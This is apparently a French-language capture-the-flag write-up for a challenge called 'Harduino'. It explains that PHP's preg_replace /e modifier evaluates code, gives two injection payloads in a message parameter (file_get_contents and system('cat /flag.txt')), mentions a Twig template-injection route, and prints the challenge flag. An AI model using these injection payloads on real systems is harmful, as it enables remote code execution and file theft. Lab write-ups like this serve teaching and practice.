# Harduino
## Challenge

Il semblerait que vous ayez trouvé un étrange gestionnaire de code...  
Le flag se trouve dans le fichier /flag.txt

## Résolution

Le modifieur `/e` effectue un eval avant de remplacer.
Il faut également échapper les quotes qui sont ajoutées avant le preg replace.

POC :

```
?message=" . file_get_contents("/flag.txt") . "
?message=" . system("cat /flag.txt") . "
```

Le moteur Twig permet également une SSTI.

## Setup

```
docker-compose up --build -d
```

## Flag

```
PHACK{W4SNT_DAT_HARD_AFT3R_ALL}
```
